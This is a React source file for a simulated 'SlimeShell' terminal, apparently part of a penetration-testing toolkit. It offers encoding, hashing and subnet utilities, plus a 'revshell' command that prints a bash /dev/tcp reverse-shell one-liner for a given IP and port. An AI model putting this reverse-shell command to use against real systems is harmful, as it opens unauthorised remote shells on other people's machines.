import { useState, useRef, useEffect, useCallback } from 'react';
import { Card } from '../components/ui/Card.jsx';
import { Terminal as TerminalIcon } from 'lucide-react';
import { md5, sha256 } from '../lib/hashing.js';
import { calcSubnet } from '../lib/network.js';
import { useAppStore } from '../store/app.js';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const PROMPT = 'root@slimeshell:~$ ';
const PROMPT_COLOR = '#6EE7B7';
const CMD_COLOR = '#FFFFFF';
const OUT_COLOR = '#9CA3AF';

const WELCOME_ART = `  ╭─────────────────────────────╮
  │     SlimeShell Terminal     │
  │    Type 'help' to start     │
  ╰─────────────────────────────╯`;

function parseLine(line) {
  const trimmed = line.trim();
  const idx = trimmed.indexOf(' ');
  if (idx === -1) return { cmd: trimmed.toLowerCase(), rest: '' };
  return { cmd: trimmed.slice(0, idx).toLowerCase(), rest: trimmed.slice(idx + 1) };
}

function formatHelpTable() {
  const rows = [
    ['help', 'List all available commands'],
    ['clear', 'Clear terminal output'],
    ['echo <text>', 'Print text'],
    ['base64 <text>', 'Base64 encode (btoa)'],
    ['base64d <text>', 'Base64 decode (atob)'],
    ['md5 <text>', 'MD5 hash'],
    ['sha256 <text>', 'SHA-256 hash'],
    ['urlencode <text>', 'encodeURIComponent'],
    ['urldecode <text>', 'decodeURIComponent'],
    ['hex <text>', 'String to hex'],
    ['unhex <hex>', 'Hex to string'],
    ['revshell <ip> <port>', 'Bash TCP reverse shell one-liner'],
    ['subnet <cidr>', 'Subnet calculator (CIDR)'],
    ['date', 'Current date/time (ISO)'],
    ['whoami', 'Current user'],
    ['uname', 'System name / version'],
    ['history', 'Numbered command history'],
    ['export', 'Show LHOST / LPORT from store'],
  ];
  const cmdW = Math.max(...rows.map((r) => r[0].length), 8);
  const lines = [
    `${'Command'.padEnd(cmdW)}  Description`,
    `${'-'.repeat(cmdW)}  ${'-'.repeat(40)}`,
    ...rows.map(([c, d]) => `${c.padEnd(cmdW)}  ${d}`),
  ];
  return lines.join('\n');
}

function runSyncCommand(cmd, rest, ctx) {
  const { lhost, lport, history } = ctx;

  switch (cmd) {
    case 'help':
      return formatHelpTable();
    case 'echo':
      return rest;
    case 'base64':
      if (!rest) return 'Usage: base64 <text>';
      try {
        return btoa(rest);
      } catch (e) {
        return `Error: ${e.message}`;
      }
    case 'base64d':
      if (!rest) return 'Usage: base64d <text>';
      try {
        return atob(rest);
      } catch (e) {
        return `Error: ${e.message}`;
      }
    case 'urlencode':
      if (!rest) return 'Usage: urlencode <text>';
      return encodeURIComponent(rest);
    case 'urldecode':
      if (!rest) return 'Usage: urldecode <text>';
      try {
        return decodeURIComponent(rest);
      } catch (e) {
        return `Error: ${e.message}`;
      }
    case 'hex':
      if (!rest) return 'Usage: hex <text>';
      return [...rest].map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    case 'unhex': {
      if (!rest) return 'Usage: unhex <hex>';
      const hex = rest.replace(/\s+/g, '');
      if (hex.length % 2 !== 0) return 'Error: odd-length hex string';
      if (!/^[0-9a-fA-F]*$/.test(hex)) return 'Error: invalid hex';
      let out = '';
      for (let i = 0; i < hex.length; i += 2) {
        out += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
      }
      return out;
    }
    case 'revshell': {
      const parts = rest.trim().split(/\s+/).filter(Boolean);
      if (parts.length < 2) return 'Usage: revshell <ip> <port>';
      const [ip, port] = parts;
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    }
    case 'subnet': {
      if (!rest.trim()) return 'Usage: subnet <cidr>';
      const info = calcSubnet(rest.trim());
      if (!info) return 'Error: invalid CIDR';
      return [
        `IP:           ${info.ip}`,
        `CIDR:         ${info.cidr}`,
        `Netmask:      ${info.netmask}`,
        `Wildcard:     ${info.wildcardMask}`,
        `Network:      ${info.network}`,
        `Broadcast:    ${info.broadcast}`,
        `First host:   ${info.firstHost}`,
        `Last host:    ${info.lastHost}`,
        `Usable hosts: ${info.totalHosts}`,
        `Class:        ${info.ipClass}`,
        `Private:      ${info.isPrivate ? 'yes' : 'no'}`,
      ].join('\n');
    }
    case 'date':
      return new Date().toISOString();
    case 'whoami':
      return 'root@slimeshell';
    case 'uname':
      return 'SlimeShell v0.3.0-alpha (Tauri/React)';
    case 'history':
      if (!history.length) return '(no commands yet)';
      return history.map((h, i) => `${String(i + 1).padStart(4)}  ${h}`).join('\n');
    case 'export':
      return `LHOST=${lhost}\nLPORT=${lport}`;
    default:
      return null;
  }
}

export default function TerminalEmulator() {
  const lhost = useAppStore((s) => s.lhost);
  const lport = useAppStore((s) => s.lport);

  const [lines, setLines] = useState(() => [
    { id: 'welcome', command: null, output: WELCOME_ART },
  ]);
  const [input, setInput] = useState('');
  const [history, setHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);

  const scrollRef = useRef(null);
  const inputRef = useRef(null);
  const lineIdRef = useRef(0);

  const scrollToBottom = useCallback(() => {
    const el = scrollRef.current;
    if (el) el.scrollTop = el.scrollHeight;
  }, []);

  useEffect(() => {
    scrollToBottom();
  }, [lines, scrollToBottom]);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const executeLine = useCallback(
    async (rawLine) => {
      const trimmed = rawLine.trim();
      if (!trimmed) return;

      const { cmd, rest } = parseLine(trimmed);

      setHistory((h) => [...h, trimmed]);
      setHistoryIndex(-1);

      if (cmd === 'clear') {
        setLines([]);
        return;
      }

      if (cmd === 'md5' || cmd === 'sha256') {
        if (!rest) {
          setLines((l) => [
            ...l,
            {
              id: `line-${++lineIdRef.current}`,
              command: trimmed,
              output: `Usage: ${cmd} <text>`,
            },
          ]);
          return;
        }
        const lineId = `line-${++lineIdRef.current}`;
        setLines((l) => [...l, { id: lineId, command: trimmed, output: 'computing...' }]);
        try {
          const fn = cmd === 'md5' ? md5 : sha256;
          const result = await fn(rest);
          setLines((l) =>
            l.map((entry) => (entry.id === lineId ? { ...entry, output: result } : entry))
          );
        } catch (e) {
          setLines((l) =>
            l.map((entry) =>
              entry.id === lineId ? { ...entry, output: `Error: ${e.message}` } : entry
            )
          );
        }
        return;
      }

      const out = runSyncCommand(cmd, rest, { lhost, lport, history: [...history, trimmed] });
      if (out !== null) {
        setLines((l) => [
          ...l,
          { id: `line-${++lineIdRef.current}`, command: trimmed, output: out },
        ]);
      } else {
        setLines((l) => [
          ...l,
          {
            id: `line-${++lineIdRef.current}`,
            command: trimmed,
            output: `${cmd}: command not found`,
          },
        ]);
      }
    },
    [history, lhost, lport]
  );

  const onKeyDown = (e) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      setHistoryIndex((idx) => {
        const h = history;
        if (!h.length) return -1;
        const next = idx === -1 ? h.length - 1 : Math.max(0, idx - 1);
        setInput(h[next] ?? '');
        return next;
      });
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      setHistoryIndex((idx) => {
        const h = history;
        if (idx === -1) return -1;
        const next = idx + 1;
        if (next >= h.length) {
          setInput('');
          return -1;
        }
        setInput(h[next] ?? '');
        return next;
      });
    }
  };

  return (
    <div style={{ padding: '0 0 24px' }}>
      <header
        style={{
          display: 'flex',
          alignItems: 'center',
          gap: 12,
          marginBottom: 16,
        }}
      >
        <div
          style={{
            width: 36,
            height: 36,
            borderRadius: 8,
            background: 'rgba(110, 231, 183, 0.12)',
            border: '1px solid rgba(110, 231, 183, 0.35)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            color: '#6EE7B7',
          }}
        >
          <TerminalIcon size={20} strokeWidth={2} />
        </div>
        <h1
          style={{
            fontFamily: heading,
            fontSize: 22,
            fontWeight: 600,
            margin: 0,
            color: '#F9FAFB',
          }}
        >
          Terminal
        </h1>
      </header>

      <Card
        className="p-0 overflow-hidden flex flex-col"
        style={{
          height: 'calc(100vh - 180px)',
          display: 'flex',
          flexDirection: 'column',
          background: '#0A0E16',
          borderColor: 'rgba(255,255,255,0.06)',
        }}
      >
        <div
          style={{
            flex: 1,
            display: 'flex',
            flexDirection: 'column',
            minHeight: 0,
            background: '#0A0E16',
            fontFamily: mono,
            fontSize: 13,
            lineHeight: 1.5,
          }}
        >
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              position: 'relative',
              padding: '10px 16px',
              borderBottom: '1px solid rgba(255,255,255,0.06)',
              flexShrink: 0,
            }}
          >
            <div style={{ position: 'absolute', left: 16, display: 'flex', gap: 8 }}>
              <span
                style={{
                  width: 12,
                  height: 12,
                  borderRadius: '50%',
                  background: '#FF5F57',
                }}
              />
              <span
                style={{
                  width: 12,
                  height: 12,
                  borderRadius: '50%',
                  background: '#FFBD2E',
                }}
              />
              <span
                style={{
                  width: 12,
                  height: 12,
                  borderRadius: '50%',
                  background: '#27C93F',
                }}
              />
            </div>
            <span style={{ color: '#9CA3AF', fontSize: 12 }}>SlimeShell Terminal</span>
          </div>

          <div
            ref={scrollRef}
            style={{
              flex: 1,
              overflow: 'auto',
              padding: '12px 16px',
              minHeight: 0,
            }}
          >
            {lines.map((entry) => (
              <div key={entry.id} style={{ marginBottom: 12 }}>
                {entry.command != null && (
                  <div style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
                    <span style={{ color: PROMPT_COLOR }}>{PROMPT}</span>
                    <span style={{ color: CMD_COLOR }}>{entry.command}</span>
                  </div>
                )}
                {entry.output != null && entry.output !== '' && (
                  <pre
                    style={{
                      margin: entry.command != null ? '4px 0 0' : 0,
                      padding: 0,
                      fontFamily: mono,
                      fontSize: 13,
                      color: OUT_COLOR,
                      whiteSpace: 'pre-wrap',
                      wordBreak: 'break-word',
                    }}
                  >
                    {entry.output}
                  </pre>
                )}
              </div>
            ))}
          </div>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              const v = input;
              setInput('');
              executeLine(v);
            }}
            style={{
              display: 'flex',
              alignItems: 'center',
              padding: '10px 16px 14px',
              borderTop: '1px solid rgba(255,255,255,0.06)',
              flexShrink: 0,
            }}
          >
            <label
              htmlFor="terminal-input"
              style={{
                display: 'flex',
                alignItems: 'center',
                width: '100%',
                gap: 0,
              }}
            >
              <span
                style={{
                  color: PROMPT_COLOR,
                  flexShrink: 0,
                  userSelect: 'none',
                }}
              >
                {PROMPT}
              </span>
              <input
                id="terminal-input"
                ref={inputRef}
                type="text"
                value={input}
                onChange={(e) => {
                  setInput(e.target.value);
                  setHistoryIndex(-1);
                }}
                onKeyDown={onKeyDown}
                autoComplete="off"
                spellCheck={false}
                style={{
                  flex: 1,
                  minWidth: 0,
                  border: 'none',
                  outline: 'none',
                  boxShadow: 'none',
                  background: 'transparent',
                  color: CMD_COLOR,
                  fontFamily: mono,
                  fontSize: 13,
                  padding: 0,
                  margin: 0,
                }}
              />
            </label>
          </form>
        </div>
      </Card>
    </div>
  );
}
